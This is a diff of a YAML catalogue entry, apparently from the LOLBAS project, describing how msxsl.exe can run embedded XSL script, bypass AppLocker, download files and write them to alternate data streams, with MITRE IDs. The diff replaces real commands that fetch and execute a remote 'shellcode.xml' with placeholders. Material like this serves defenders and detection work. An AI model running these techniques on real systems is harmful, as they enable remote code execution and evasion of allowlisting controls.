@@ -1,45 +1,55 @@
 ---
 Name: msxsl.exe
 Description: Command line utility used to perform XSL transformations.
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: msxsl.exe customers.xml script.xsl
+  - Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
     Description: Run COM Scriptlet code within the script.xsl file (local).
     Usecase: Local execution of script stored in XSL file.
     Category: Execute
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
-  - Command: msxsl.exe customers.xml script.xsl
+    Tags:
+      - Execute: XSL
+  - Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
     Description: Run COM Scriptlet code within the script.xsl file (local).
     Usecase: Local execution of script stored in XSL file.
     Category: AWL Bypass
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
-  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+    Tags:
+      - Execute: XSL
+  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
     Category: Execute
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
-  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+    Tags:
+      - Execute: XSL
+      - Execute: Remote
+  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
     Category: AWL Bypass
     Privileges: User
     MitreID: T1220
     OperatingSystem: Windows
-  - Command: msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>
+    Tags:
+      - Execute: XSL
+      - Execute: Remote
+  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
     Description: Using remote XML and XSL files, save the transformed XML file to disk.
     Usecase: Download a file from the internet and save it to disk.
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows
-  - Command: msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>:ads-name
+  - Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
     Description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
     Usecase: Download a file from the internet and save it to an NTFS Alternate Data Stream.
     Category: ADS
